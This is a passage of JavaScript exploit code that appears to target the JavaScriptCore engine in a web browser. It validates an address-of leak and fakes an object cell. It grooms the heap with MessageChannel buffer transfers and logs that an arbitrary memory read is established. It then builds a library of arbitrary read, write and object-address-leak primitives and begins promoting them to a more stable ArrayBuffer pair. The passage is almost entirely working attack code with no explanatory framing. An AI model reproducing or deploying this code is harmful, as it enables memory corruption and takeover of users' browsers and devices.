            try { targetView[0] = 0xa5; } catch { }
            try { rwMirror[0] = 0x3c; } catch { }
            try { clearPredecessor(); } catch { }
            compositionError = error;
            compositionState = -1;
        }
    }

    function runGroomAndLoad() {
        try {
            emit("SSV-GROOM-ENTER", `n=${DRAIN_COUNT}`);
            const channel = new MessageChannel();
            channel.port1.close();
            channel.port2.close();

            for (let i = 0; i < DRAIN_COUNT; ++i)
                keepAlive$1[keepIndex++] = buffer(DRAIN_SIZE);

            let slab = buffer(SLAB_SIZE);
            channel.port1.postMessage(0, [slab]);
            slab = null;

            const butterflyHole1 = buffer(BUTTERFLY_HOLE_SIZE);
            const butterflyHole2 = buffer(BUTTERFLY_HOLE_SIZE);
            const separator = buffer(SEPARATOR_SIZE);
            const earlyHole = buffer(EARLY_HOLE_SIZE);
            const guard = buffer(GUARD_SIZE);
            const predecessor = buffer(PREDECESSOR_SIZE);
            const finalHole = buffer(FINAL_HOLE_SIZE);

            fillRawCellPointers(predecessor, fakeAddress);
            keepAlive$1[keepIndex++] = separator;
            keepAlive$1[keepIndex++] = guard;
            keepAlive$1[keepIndex++] = predecessor;
            emit("PREDECESSOR-FILLED", `qwords=${PREDECESSOR_SIZE / 8}`
                + `-fake=${hex(fakeAddress)}`);

            criticalBarrier(fakeAddress, targetAddress);

            channel.port1.postMessage(0, [butterflyHole1, butterflyHole2,
                earlyHole, finalHole]);
            loadHistoryCritical();
        } catch (error) {
            try { clearPredecessor(); } catch {}
            retrySafe = true;
            compositionError = error;
            compositionState = -1;
        }
        reportComposition();
    }

    let barrierNode = null;

    function ensureBarrierNode() {
        if (barrierNode !== null)
            return;
        try {
            barrierNode = document.createElement("div");
            barrierNode.style.cssText = "position:absolute;left:-9999px;top:0";
            document.body.appendChild(barrierNode);
        } catch { barrierNode = null; }
    }

    function defaultCriticalBarrier(fake, target) {
        try {
            const line = `CRITICAL-LOAD-NEXT-fake=${hex(fake)}-target=${hex(target)}`;
            if (barrierNode !== null) {
                barrierNode.textContent = line;
                void barrierNode.offsetWidth;
            }
            void new Blob([line], { type: "text/plain" });

            try { sessionStorage.setItem(burstKey, line); } catch { }
        } catch { }
    }

    function beginComposition() {
        if (captureState === 0) {
            finishEarlySafeAttempt("ADDROF-NO-RESULT",
                "capture-task-did-not-finish", "addrof-no-result");
            return;
        }
        if (captureState < 0) {
            finishEarlySafeAttempt("ADDROF-THREW",
                `${captureError?.name}:`
                + String(captureError?.message).slice(0, 80),
                "addrof-threw");
            return;
        }

        const a0 = pointerFromWords(capturedWords, 0);
        const b0 = pointerFromWords(capturedWords, 4);
        const a1 = pointerFromWords(capturedWords, 8);
        const b1 = pointerFromWords(capturedWords, 12);
        const repeated = a0 === a1 && b0 === b1;
        const distinct = a0 !== b0;
        const plausible = plausibleCell(a0) && plausibleCell(b0)
            && plausibleCell(a1) && plausibleCell(b1);
        const fakeChars = copiedLength >= 8 ? copiedLength - 8 : 0;
        const sourceCovered = fakeChars * 2 <= CARRIER_BYTES;

        emit("ADDROF-RETURNED", REVISION);
        emit("ADDROF-COPY", `chars=${copiedLength}-source-covered=${sourceCovered}`);
        emit("ADDROF-POINTERS", `HOST=${hex(a0)}-TARGET=${hex(b0)}`
            + `-HOST2=${hex(a1)}-TARGET2=${hex(b1)}`);

        if (!(repeated && distinct && plausible && sourceCovered)) {
            finishEarlySafeAttempt("ADDROF-FAIL",
                `repeat=${repeated}-distinct=${distinct}`
                + `-plausible=${plausible}-covered=${sourceCovered}`,
                "addrof-validation");
            return;
        }

        hostAddress = a0;
        targetAddress = b0;
        targetAddressHigh = Math.floor(targetAddress / 0x100000000);
        targetAddressLow = targetAddress - targetAddressHigh * 0x100000000;
        if (targetAddressHigh < 0 || targetAddressHigh > 0xffff
            || targetAddressLow < 0 || targetAddressLow > 0xffffffff
            || Math.floor(targetAddressLow) !== targetAddressLow
            || targetAddressLow + targetAddressHigh * 0x100000000 !== targetAddress) {
            finishEarlySafeAttempt("TARGET-ADDRESS-FAIL",
                `target=${hex(targetAddress)}`, "target-address");
            return;
        }

        fakeAddress = hostAddress + 0x10;
        if (!plausibleCell(fakeAddress) || fakeAddress - hostAddress !== 0x10) {
            finishEarlySafeAttempt("FAKE-ADDRESS-FAIL",
                `host=${hex(hostAddress)}`, "fake-address");
            return;
        }
        emit("FAKE-ADDRESS", `host=${hex(hostAddress)}-fake=${hex(fakeAddress)}`
            + "-delta=0x10");
        runGroomAndLoad();
    }

    function reportComposition() {
        if (compositionState < 0) {
            emit(retrySafe ? "SSV-PLACEMENT-MISS" : "LOAD-THREW",
                `${compositionError?.name}:`
                + String(compositionError?.message).slice(0, 80));
            if (!retrySafe)
                failed();
            else
                scheduleSafeRetry("placement-throw");
            return;
        }

        if (compositionState === 2) {
            emit("NORMAL-CLONE-MISS", "known-reference-returned=true");
            scheduleSafeRetry("normal-clone-miss");
            return;
        }

        if (compositionState === 3) {
            emit(identityResult === -1 ? "CARRIER-IDENTITY-FAIL"
                : (zeroHeaderMiss ? "ZERO-HEADER-MISS"
                    : (retrySafe ? "COMPOSITION-LENGTH-MISS"
                        : "VALIDATION-MISMATCH")),
                `rw=${rwHeaderOK}-holder=${holderHeaderOK}`
                + `-function=${functionHeaderOK}`
                + `-native-executable=${nativeExecutableHeaderOK}`
                + `-repeat=${pointersRepeated}-retry-safe=${retrySafe}`
                + `-identity=${identityResult}`
                + `-hex=${dumpHex(rwHeader, CELL_BYTES)}`);
            if (!retrySafe)
                failed();
            else
                scheduleSafeRetry(zeroHeaderMiss
                    ? "zero-header-miss" : "composition-length-mismatch");
            return;
        }

        if (compositionState === 0) {
            emit("NO-RESULT", "critical-load-did-not-finish");
            failed();
            return;
        }

        emit("SSV-RETURNED-CLEARED", `length=${compositionLength}`
            + "-predecessor-cleared=true");
        emit("RW-CARRIER", `sid=${hex(profile.carrierSID)}`
            + `-vector=${hex(rwOriginalVector)}`
            + `-length=${hex(uint32At(rwHeader, 0x18))}`
            + `-mode=${hex(profile.carrierMode)}`);
        emit("HOLDER", `cell=${hex(targetAddress)}`
            + `-textarea=${hex(anchorElementAddress)}`
            + `-markerA=${hex(markerAAddress)}-markerB=${hex(markerBAddress)}`);
        emit("JSC-PROFILE", `u8=${hex(profile.carrierType)}`
            + `-u8flags=${hex(profile.carrierFlags)}`
            + `-mode=${hex(profile.carrierMode)}`
            + `-obj=${hex(profile.holderType)}`
            + `-objflags=${hex(profile.holderFlags)}`
            + `-fn=${hex(profile.functionType)}`
            + `-fnflags=${hex(profile.functionFlags)}`
            + `-nx=${hex(profile.nativeExecType)}`
            + `-nxflags=${hex(profile.nativeExecFlags)}`);
        emit("RW-HEADER-HEX", dumpHex(rwHeader, CELL_BYTES));

        const leakPass = rwHeaderOK && holderHeaderOK && functionHeaderOK
            && nativeExecutableHeaderOK && pointersRepeated && restoreObserved
            && compositionLength === EXPECTED_LENGTH
            && liveCandidate !== null;

        if (!leakPass) {
            emit("READ-PRIMITIVE-MISMATCH", `rw=${rwHeaderOK}`
                + `-holder=${holderHeaderOK}-function=${functionHeaderOK}`
                + `-native=${nativeExecutableHeaderOK}`
                + `-repeat=${pointersRepeated}-restore=${restoreObserved}`);

            liveCandidate = null;
            failed();
            return;
        }

        emit("READ-PRIMITIVE-PASS", "arbitrary-read-established"
            + "-firmware-offsets-asserted=none");

        try { history.replaceState(null, ""); } catch { }

        stopped = true;
        running = false;
        const resolve = settleResolve;
        settleResolve = null;
        settleReject = null;
        if (resolve !== null)
            resolve(buildCarrier());
    }

    function buildCarrier() {

        profile.cellSize = 0x20;

        return {

            aim(address) {

                if (liveCandidate === null)
                    throw new Error("core.aim: carrier is no longer live");
                if (!plausibleAddress(address))
                    throw new RangeError(`core.aim: implausible address ${address}`);
                aimCarrier(liveCandidate, address);
            },
            restore() {
                if (liveCandidate === null)
                    throw new Error("core.restore: carrier is no longer live");
                restoreCarrier(liveCandidate);
            },

            get view() { return rwView; },
            windowBytes: RW_BUFFER_SIZE,

            holder: targetHolder,
            holderAddress: targetAddress,
            leakSlotOffset: LEAK_SLOT_OFFSET,
            leakSlotAddress: targetAddress + LEAK_SLOT_OFFSET,
            setLeakSlot(value) { targetHolder.q2 = value; },
            clearLeakSlot() { targetHolder.q2 = markerObjectA; },

            anchorObject: markerObjectA,
            anchorObjectAddress: markerAAddress,
            textarea: anchorElement,
            textareaAddress: anchorElementAddress,

            profile,
            attempts: attemptNumber,
            validate: plausibleAddress,

            hostAddress,
            fakeAddress,

            assertHome() {
                if (liveCandidate === null || rwView === null || targetView === null
                    || rwMirror === null)
                    return false;
                return rwView[0] === 0x3c && rwMirror[0] === 0x3c
                    && targetView[0] === 0xa5;
            }
        };
    }

    function establishPrimitive(options) {
        const opts = options || {};

        if (fakeReleased)
            return Promise.reject(new Error(
                "core: the fake cell has been released to the real-cell pair -- "
                + "establishPrimitive cannot run again in this page"));
        if (running)
            return Promise.reject(new Error("core: already running"));
        if (typeof BigInt !== "function" || typeof MessageChannel !== "function"
            || typeof Symbol !== "function" || typeof history === "undefined"
            || typeof history.replaceState !== "function")
            return Promise.reject(new Error("core: unsupported browser"));

        onEvent = typeof opts.onEvent === "function" ? opts.onEvent : null;
        criticalBarrier = typeof opts.beforeCriticalLoad === "function"
            ? opts.beforeCriticalLoad : defaultCriticalBarrier;

        if (criticalBarrier === defaultCriticalBarrier)
            ensureBarrierNode();
        attemptCeiling = typeof opts.maxAttempts === "number" && opts.maxAttempts > 0
            ? opts.maxAttempts : 0;

        running = true;
        stopped = false;
        attemptNumber = 1;
        try { sessionStorage.removeItem(attemptKey); } catch { }

        return new Promise((resolve, reject) => {
            settleResolve = resolve;
            settleReject = reject;
            startAttempt();
        });
    }

    const RELEASED_BINDINGS = [
        "liveCandidate", "fakeHost", "lengthWord",
        "getterCarrier", "leakedScope", "preparedSymbolObject",
        "capturedString", "capturedWords",
        "predecessorWords", "outerGraph", "fillerGraph", "referenceTarget",
        "keepAlive"
    ];

    function releaseFakeCell() {
        const report = {
            released: RELEASED_BINDINGS.slice(),
            alreadyReleased: fakeReleased,
            hostAddress,
            fakeAddress,
            historyCleared: false
        };
        if (fakeReleased)
            return report;

        liveCandidate = null;
        fakeHost = null;
        lengthWord = null;

        getterCarrier = null;
        leakedScope = null;
        preparedSymbolObject = null;

        capturedString = null;
        capturedWords = null;

        predecessorWords = null;
        outerGraph = null;
        fillerGraph = null;
        referenceTarget = null;
        keepAlive$1 = null;

        try {
            history.replaceState(null, "");
            report.historyCleared = history.state === null;
        } catch (_) { }

        fakeReleased = true;
        stopped = true;
        running = false;

        retryScheduled = false;
        return report;
    }

    function fakeCellReleased() {
        return fakeReleased;
    }

    function carrierHeaderCopy() {
        return rwHeader.slice(0, CELL_BYTES);
    }

    function carrierHomeVector() {
        return rwOriginalVector;
    }

    function zeroFill(number, width) {
        width -= number.toString().length;

        if (width > 0) {
            return new Array(width + (/\./.test(number) ? 2 : 1)).join('0') + number;
        }

        return number + "";
    }

    function int64(low, hi) {

        this.low = (low >>> 0);

        this.hi = (hi >>> 0);

        this.backing = null;

        this.add32inplace = function (val) {
            let new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
            let new_hi = (this.hi >>> 0);

            if (new_lo < this.low) {
                new_hi++;
            }

            this.hi = new_hi;
            this.low = new_lo;
            if (this.backing !== null) {
                if (this.backing.byteLength < val) {
                    throw new Error("int64.add32inplace: overflow");
                }

                this.backing = new Uint8Array(this.backing.buffer, val, this.backing.byteLength - val);
            }
        };

        this.add32 = function (val) {
            let new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
            let new_hi = (this.hi >>> 0);

            if (new_lo < this.low) {
                new_hi++;
            }

            let ret = new int64(new_lo, new_hi);
            if (this.backing !== null) {
                if (this.backing.byteLength < val) {
                    throw new Error("int64.add32: overflow");
                }

                ret.backing = new Uint8Array(this.backing.buffer, val, this.backing.byteLength - val);
            }

            return ret;
        };

        this.sub32 = function (val) {
            let new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
            let new_hi = (this.hi >>> 0);

            if (new_lo > (this.low) & 0xFFFFFFFF) {
                new_hi--;
            }

            return new int64(new_lo, new_hi);
        };

        this.sub32inplace = function (val) {
            let new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
            let new_hi = (this.hi >>> 0);

            if (new_lo > (this.low) & 0xFFFFFFFF) {
                new_hi--;
            }

            this.hi = new_hi;
            this.low = new_lo;
        };

        this.and32 = function (val) {
            let new_lo = this.low & val;
            let new_hi = this.hi;
            return new int64(new_lo, new_hi);
        };

        this.and64 = function (vallo, valhi) {
            let new_lo = this.low & vallo;
            let new_hi = this.hi & valhi;
            return new int64(new_lo, new_hi);
        };

        this.toString = function (radix = 16) {
            let lo_str = (this.low >>> 0).toString(radix);
            let hi_str = (this.hi >>> 0).toString(radix);

            if (this.hi == 0) {
                return lo_str;
            } else {

                const width = radix === 16 ? 8 : Math.ceil(32 / Math.log2(radix));
                lo_str = zeroFill(lo_str, width);
            }

            return hi_str + lo_str;
        };

        return this;
    }

    globalThis.int64 = int64;

    let carrier = null;

    function toI64(x) {
        if (x instanceof int64)
            return x;
        if (typeof x === "number") {
            if (!Number.isFinite(x) || Math.floor(x) !== x || x < 0)
                throw new TypeError(`mem: bad numeric address ${x}`);

            const hi = Math.floor(x / 0x100000000);
            return new int64(x - hi * 0x100000000, hi);
        }
        if (x !== null && typeof x === "object" && "low" in x)
            return new int64(x.low, ("hi" in x) ? x.hi : x.high);
        throw new TypeError("mem: bad address");
    }

    function addrNumber(x) {
        const a = toI64(x);
        if (a.hi > 0xffff)
            throw new RangeError(`mem: non-canonical address 0x${a.toString()}`);
        return a.hi * 0x100000000 + a.low;
    }

    function aimFor(addrLike, size) {
        const address = addrNumber(addrLike);
        if (size > carrier.windowBytes)
            throw new RangeError(`mem: ${size} exceeds the ${carrier.windowBytes}-byte window`);
        carrier.aim(address);
        return address;
    }

    function valueLow32(value, who) {
        if (typeof value === "number") {
            if (!Number.isFinite(value) || Math.floor(value) !== value)
                throw new TypeError(`${who}: non-integer value ${value}`);
            return value >>> 0;
        }
        if (value instanceof int64)
            return value.low >>> 0;
        if (value !== null && typeof value === "object" && "low" in value)
            return toI64(value).low >>> 0;
        throw new TypeError(`${who}: value must be a number or an int64`);
    }

    function read1(addr) {
        aimFor(addr, 1);
        try {
            return carrier.view[0];
        } finally {
            carrier.restore();
        }
    }

    function read2(addr) {
        aimFor(addr, 2);
        try {
            const v = carrier.view;
            return v[0] | (v[1] << 8);
        } finally {
            carrier.restore();
        }
    }

    function read4(addr) {
        aimFor(addr, 4);
        try {
            const v = carrier.view;
            return (v[0] | (v[1] << 8) | (v[2] << 16) | (v[3] << 24)) >>> 0;
        } finally {
            carrier.restore();
        }
    }

    function read8(addr) {
        let lo, hi;
        aimFor(addr, 8);
        try {
            const v = carrier.view;
            lo = (v[0] | (v[1] << 8) | (v[2] << 16) | (v[3] << 24)) >>> 0;
            hi = (v[4] | (v[5] << 8) | (v[6] << 16) | (v[7] << 24)) >>> 0;
        } finally {
            carrier.restore();
        }
        return new int64(lo, hi);
    }

    function write1(addr, value) {
        const v = valueLow32(value, "mem.write1") & 0xff;
        aimFor(addr, 1);
        try {
            carrier.view[0] = v;
        } finally {
            carrier.restore();
        }
    }

    function write2(addr, value) {
        const v = valueLow32(value, "mem.write2") & 0xffff;
        aimFor(addr, 2);
        try {
            const view = carrier.view;
            view[0] = v & 0xff;
            view[1] = (v >>> 8) & 0xff;
        } finally {
            carrier.restore();
        }
    }

    function write4(addr, value) {
        const v = valueLow32(value, "mem.write4");
        aimFor(addr, 4);
        try {
            const view = carrier.view;
            view[0] = v & 0xff;
            view[1] = (v >>> 8) & 0xff;
            view[2] = (v >>> 16) & 0xff;
            view[3] = (v >>> 24) & 0xff;
        } finally {
            carrier.restore();
        }
    }

    function write8(addr, value) {
        let lo, hi;
        if (value instanceof int64) {
            lo = value.low >>> 0;
            hi = value.hi >>> 0;
        } else if (typeof value === "number") {
            if (!Number.isFinite(value) || Math.floor(value) !== value)
                throw new TypeError(`mem.write8: non-integer value ${value}`);
            if (value < 0) {
                if (value < -2147483648)
                    throw new RangeError(`mem.write8: value ${value} below int32 range`);
                lo = value >>> 0;
                hi = 0xffffffff;
            } else if (value <= 0xffffffff) {
                lo = value >>> 0;
                hi = 0;
            } else {
                throw new RangeError(
                    `mem.write8: ${value} exceeds 32 bits -- pass an int64`);
            }
        } else if (value !== null && typeof value === "object" && "low" in value) {
            const n = toI64(value);
            lo = n.low; hi = n.hi;
        } else {
            throw new TypeError("mem.write8: value must be int64 or number");
        }

        aimFor(addr, 8);
        try {
            const view = carrier.view;
            view[0] = lo & 0xff;
            view[1] = (lo >>> 8) & 0xff;
            view[2] = (lo >>> 16) & 0xff;
            view[3] = (lo >>> 24) & 0xff;
            view[4] = hi & 0xff;
            view[5] = (hi >>> 8) & 0xff;
            view[6] = (hi >>> 16) & 0xff;
            view[7] = (hi >>> 24) & 0xff;
        } finally {
            carrier.restore();
        }
    }

    function leakval(obj) {
        if (obj === null || (typeof obj !== "object" && typeof obj !== "function"))
            throw new TypeError("mem.leakval: not an object");

        carrier.setLeakSlot(obj);
        let lo, hi;
        try {

            aimFor(carrier.leakSlotAddress, 8);
            try {
                const v = carrier.view;
                lo = (v[0] | (v[1] << 8) | (v[2] << 16) | (v[3] << 24)) >>> 0;
                hi = (v[4] | (v[5] << 8) | (v[6] << 16) | (v[7] << 24)) >>> 0;
            } finally {
                carrier.restore();
            }
        } finally {
            carrier.clearLeakSlot();
        }

        if (hi > 0xffff || (lo === 0 && hi === 0) || (lo & 7) !== 0)
            throw new Error(`mem.leakval: implausible cell 0x${
            new int64(lo, hi).toString()}`);
        return new int64(lo, hi);
    }

    function readInto(dest, addr, count) {
        const base = addrNumber(addr);
        let done = 0;
        while (done < count) {
            const chunk = Math.min(count - done, carrier.windowBytes);
            aimFor(base + done, chunk);
            try {
                for (let i = 0; i < chunk; ++i)
                    dest[done + i] = carrier.view[i];
            } finally {
                carrier.restore();
            }
            done += chunk;
        }
        return dest;
    }

    const WORKER_BUFFER_SIZE = 0x100;
    const PAIR_IDENT_OFFSET = 0x20;
    const MAIN_IDENT_OFFSET = 0x40;
    const PAIR_HEADER_BYTES = 0x20;
    const HOME_BYTE = 0x3c;

    const WORKER_LENGTH_MAX = 0xffffffff;

    const mainMagic = new Uint8Array([0x63, 0x9e, 0x1f, 0x29, 0xd2, 0x84, 0x0b, 0x5c]);
    const workerMagic = new Uint8Array([0x9e, 0x37, 0x79, 0xb9, 0x7f, 0x4a, 0x7c, 0x15]);

    const workerHeader = new Uint8Array(PAIR_HEADER_BYTES);
    const identityBytes = new Uint8Array(8);
    const workerOriginalVector = new Uint8Array(8);
    const workerOriginalLength = new Uint8Array(4);
    const pairScratch = new ArrayBuffer(8);
    const pairScratchBytes = new Uint8Array(pairScratch);
    const pairScratchWords = new Uint32Array(pairScratch);

    let mainView = null;
    let workerBuffer = null;
    let workerView = null;
    let workerMirror = null;
    let pairVectorOffset = -1;
    const retained = [];

    const pairStatus = {

        state: "not-attempted",
        promoted: false,

        committed: false,
        rolledBack: false,
        rollbackClean: null,
        fallback: false,
        stage: "not-attempted",
        failedAt: null,
        error: null,

        vectorOffset: -1, lengthOffset: -1, modeOffset: -1, butterflyOffset: -1,

        mainAddress: null,
        mainVector: null,

        mainRecordVector: null,
        mainWindow: -1,
        mainCellFromFakeSlot: null,
        mainIdentity: null,
        mainAtHome: null,

        workerAddress: null,
        workerVector: null,
        workerButterfly: null,
        workerWindow: -1,
        workerLength: -1,
        workerIdentity: null,

        structureID: -1, mode: -1, leakvalAgrees: false,

        fakeAddress: null,
        fakeButterfly: null,
        released: []
    };

    function u32At(bytes, offset) {
        return (bytes[offset] | (bytes[offset + 1] << 8)
            | (bytes[offset + 2] << 16) | (bytes[offset + 3] << 24)) >>> 0;
    }

    function low48At(bytes, offset) {
        return bytes[offset]
            + bytes[offset + 1] * 0x100
            + bytes[offset + 2] * 0x10000
            + bytes[offset + 3] * 0x1000000
            + bytes[offset + 4] * 0x100000000
            + bytes[offset + 5] * 0x10000000000;
    }

    function canonical48(bytes, offset) {
        return bytes[offset + 6] === 0 && bytes[offset + 7] === 0;
    }

    function sameBytes$1(left, right, count) {
        for (let i = 0; i < count; ++i) {
            if (left[i] !== right[i])
                return false;
        }
        return true;
    }

    function hexOf(bytes, count) {
        let out = "";
        for (let i = 0; i < count; ++i)
            out += (bytes[i] & 0xff).toString(16).padStart(2, "0");
        return out;
    }

    function pairAim(address) {
        const high = Math.floor(address / 0x100000000);
        pairScratchWords[0] = address - high * 0x100000000;
        pairScratchWords[1] = high;
        for (let i = 0; i < 8; ++i)
            mainView[pairVectorOffset + i] = pairScratchBytes[i];
    }

    function pairRestore() {
        for (let i = 0; i < 8; ++i)
            mainView[pairVectorOffset + i] = workerOriginalVector[i];
    }

    function buildPairCarrier(fake) {
        const validate = fake.validate;
        return {
            aim(address) {
                if (mainView === null || workerView === null)
                    throw new Error("mem.pair.aim: the pair has been dropped");
                if (!validate(address))
                    throw new RangeError(`mem.pair.aim: implausible address ${address}`);
                pairAim(address);
            },
            restore() {
                if (mainView === null)
                    throw new Error("mem.pair.restore: the pair has been dropped");
                pairRestore();
            },
            get view() { return workerView; },

            windowBytes: WORKER_BUFFER_SIZE,

            holder: fake.holder,
            holderAddress: fake.holderAddress,
            leakSlotOffset: fake.leakSlotOffset,
            leakSlotAddress: fake.leakSlotAddress,
            setLeakSlot: fake.setLeakSlot,
            clearLeakSlot: fake.clearLeakSlot,
            anchorObject: fake.anchorObject,
            anchorObjectAddress: fake.anchorObjectAddress,
            textarea: fake.textarea,
            textareaAddress: fake.textareaAddress,

            profile: fake.profile,
            attempts: fake.attempts,
            validate,
            hostAddress: fake.hostAddress,
            fakeAddress: fake.fakeAddress,
            pair: pairStatus,

            assertHome() {
                if (workerView === null || workerMirror === null)
                    return false;
                return workerView[0] === HOME_BYTE && workerMirror[0] === HOME_BYTE;
            }
        };
    }

    function brokenCarrier(why) {
        const die = () => {
            throw new Error("mem: the primitive is disabled -- the promotion failed "
                + `and its rollback did not verify (${why})`);
        };
        return {
            aim: die, restore: die, setLeakSlot: die, clearLeakSlot: die,
            get view() { return die(); },
            get windowBytes() { return die(); },
            get leakSlotAddress() { return die(); },
            validate: () => false,
            assertHome: () => false,
            profile: null,
            pair: pairStatus
        };
    }

    function proveMagic(note, who, slot, at, expected, context) {
        const target = toI64(at);
        const record = {
            at: target, expected: hexOf(expected, 8), found: null, pass: false
        };
        pairStatus[slot] = record;
        readInto(identityBytes, at, 8);
        record.found = hexOf(identityBytes, 8);
        record.pass = sameBytes$1(identityBytes, expected, 8);
        note(`PAIR-IDENTITY-${who.toUpperCase()}`,
            `at=0x${target.toString()}-found=${record.found}`
            + `-expected=${record.expected}-pass=${record.pass}-${context}`);
        if (!record.pass)
            throw new Error(`mem.promote: ${who} identity failed -- read `
                + `${record.found} at 0x${target.toString()}, expected `
                + `${record.expected} (${context})`);
        return record;
    }

    function promoteToRealPair(onEvent) {
        const note = (tag, detail) => {
            pairStatus.stage = tag;
            if (typeof onEvent === "function") {
                try { onEvent(tag, detail === undefined ? "" : String(detail)); }
                catch {  }
            }
        };

        if (pairStatus.promoted)
            throw new Error("mem.promote: already promoted");
        if (carrier === null || typeof carrier.aim !== "function")
            throw new TypeError("mem.promote: no carrier");
        if (fakeCellReleased())
            throw new Error("mem.promote: core.js already released the fake cell");

        const fake = carrier;
        const profile = fake.profile;
        if (!profile || typeof profile.vectorOffset !== "number"
            || typeof profile.butterflyOffset !== "number"
            || typeof profile.inlineSlotOffset !== "number")
            throw new TypeError("mem.promote: carrier has no layout profile");

        if (typeof fake.hostAddress !== "number" || !fake.validate(fake.hostAddress)
            || typeof fake.fakeAddress !== "number" || !fake.validate(fake.fakeAddress)
            || fake.fakeAddress - fake.hostAddress !== profile.inlineSlotOffset)
            throw new TypeError("mem.promote: the fake cell's address is unusable "
                + `(host=${fake.hostAddress} fake=${fake.fakeAddress})`);

        const VECTOR_OFF = profile.vectorOffset;
        const LENGTH_OFF = VECTOR_OFF + 8;
        const MODE_OFF = LENGTH_OFF + 4;
        const BUTTERFLY_OFF = profile.butterflyOffset;
        pairStatus.vectorOffset = VECTOR_OFF;
        pairStatus.lengthOffset = LENGTH_OFF;
        pairStatus.modeOffset = MODE_OFF;
        pairStatus.butterflyOffset = BUTTERFLY_OFF;

        let committed = false;
        let rebound = false;

        try {
            note("PAIR-BEGIN", `window=${fake.windowBytes}-vector=+${VECTOR_OFF}`
                + `-length=+${LENGTH_OFF}-mode=+${MODE_OFF}`);

            const mainRecord = carrierHeaderCopy();
            const mainHomeVector = carrierHomeVector();
            if (!(mainRecord instanceof Uint8Array)
                || mainRecord.length < PAIR_HEADER_BYTES)
                throw new Error("mem.promote: core.js's carrier record is the wrong shape");

            const recordVector = low48At(mainRecord, VECTOR_OFF);
            pairStatus.mainVector = toI64(mainHomeVector);
            pairStatus.mainRecordVector = toI64(recordVector);
            pairStatus.mainWindow = u32At(mainRecord, LENGTH_OFF);
            pairStatus.structureID = u32At(mainRecord, 0);
            note("PAIR-MAIN-RECORD", `home=0x${pairStatus.mainVector.toString()}`
                + `-record=0x${pairStatus.mainRecordVector.toString()}`
                + `-len=${pairStatus.mainWindow}-mode=${mainRecord[MODE_OFF]}`
                + `-sid=0x${(pairStatus.structureID >>> 0).toString(16)}`);

            if (recordVector !== mainHomeVector)
                throw new Error("mem.promote: profile.vectorOffset disagrees with the "
                    + `recorded home vector (record 0x${pairStatus.mainRecordVector.toString()}`
                    + ` vs home 0x${pairStatus.mainVector.toString()})`);
            if (!fake.validate(mainHomeVector) || mainHomeVector % 8 !== 0)
                throw new Error("mem.promote: the recorded home vector is implausible "
                    + `(0x${pairStatus.mainVector.toString()})`);

            if (pairStatus.mainWindow !== fake.windowBytes)
                throw new Error(`mem.promote: the record's m_length (${pairStatus.mainWindow})`
                    + ` is not the carrier window (${fake.windowBytes})`
                    + " -- LENGTH_OFF does not hold on main");

            mainView = fake.view;
            retained.push(mainView);
            if (!(mainView instanceof Uint8Array)
                || mainView.length !== fake.windowBytes
                || MAIN_IDENT_OFFSET + 8 > fake.windowBytes)
                throw new Error("mem.promote: the carrier's view is not what core.js described");

            pairStatus.fakeAddress = toI64(fake.fakeAddress);
            pairStatus.fakeButterfly = read8(fake.fakeAddress + BUTTERFLY_OFF);
            note("PAIR-FAKE-BUTTERFLY", `host=0x${toI64(fake.hostAddress).toString()}`
                + `-fake=0x${pairStatus.fakeAddress.toString()}`
                + `-butterfly=0x${pairStatus.fakeButterfly.toString()}`);

            workerBuffer = new ArrayBuffer(WORKER_BUFFER_SIZE);
            workerView = new Uint8Array(workerBuffer);
            workerMirror = new Uint8Array(workerBuffer);
            retained.push(workerBuffer, workerView, workerMirror);
            workerMirror[0] = HOME_BYTE;
            for (let i = 0; i < 8; ++i)
                workerMirror[PAIR_IDENT_OFFSET + i] = workerMagic[i];

            if (workerView[0] !== HOME_BYTE)
                throw new Error("mem.promote: workerView does not alias workerMirror");

            for (let i = 0; i < 8; ++i)
                mainView[MAIN_IDENT_OFFSET + i] = mainMagic[i];
            for (let i = 0; i < 8; ++i) {
                if (mainView[MAIN_IDENT_OFFSET + i] !== mainMagic[i])
                    throw new Error("mem.promote: main's magic did not read back through "
                        + "its own JS view -- the carrier is not at home");
            }

            const mainAddr = addrNumber(leakval(mainView));
            const workerAddr = addrNumber(leakval(workerView));
            pairStatus.mainAddress = toI64(mainAddr);
            pairStatus.workerAddress = toI64(workerAddr);
            note("PAIR-CELLS", `main=0x${pairStatus.mainAddress.toString()}`
                + `-worker=0x${pairStatus.workerAddress.toString()}`);
            if (mainAddr === workerAddr)
                throw new Error("mem.promote: main and worker leaked the same cell");

            if (mainAddr % 0x10 !== 0 || workerAddr % 0x10 !== 0)
                throw new Error("mem.promote: a leaked cell is not atom-aligned");

            const fromFakeSlot = read8(fake.fakeAddress + VECTOR_OFF);
            pairStatus.mainCellFromFakeSlot = fromFakeSlot;
            note("PAIR-MAIN-CELL", `fake-m_vector=0x${fromFakeSlot.toString()}`
                + `-leakval=0x${pairStatus.mainAddress.toString()}`
                + `-at=0x${toI64(fake.fakeAddress + VECTOR_OFF).toString()}`);
            if (fromFakeSlot.low !== pairStatus.mainAddress.low
                || fromFakeSlot.hi !== pairStatus.mainAddress.hi)
                throw new Error("mem.promote: main CELL identity failed -- the fake "
                    + `cell's m_vector slot holds 0x${fromFakeSlot.toString()} but `
                    + `leakval(mainView) says 0x${pairStatus.mainAddress.toString()}`);

            proveMagic(note, "main", "mainIdentity",
                mainHomeVector + MAIN_IDENT_OFFSET, mainMagic,
                `home=0x${pairStatus.mainVector.toString()}`
                + `-cell=0x${pairStatus.mainAddress.toString()}`
                + `-offset=+0x${MAIN_IDENT_OFFSET.toString(16)}`);

            readInto(workerHeader, workerAddr, PAIR_HEADER_BYTES);
            const workerVector = low48At(workerHeader, VECTOR_OFF);
            const workerButterfly = low48At(workerHeader, BUTTERFLY_OFF);
            pairStatus.mode = workerHeader[MODE_OFF];
            pairStatus.workerWindow = u32At(workerHeader, LENGTH_OFF);
            pairStatus.workerVector = toI64(workerVector);
            pairStatus.workerButterfly = toI64(workerButterfly);
            note("PAIR-WORKER-HEADER", `sid=0x${u32At(workerHeader, 0).toString(16)}`
                + `-vector=0x${pairStatus.workerVector.toString()}`
                + `-len=${pairStatus.workerWindow}-mode=${pairStatus.mode}`
                + `-butterfly=0x${pairStatus.workerButterfly.toString()}`);

            const gate =
                u32At(workerHeader, 0) === pairStatus.structureID
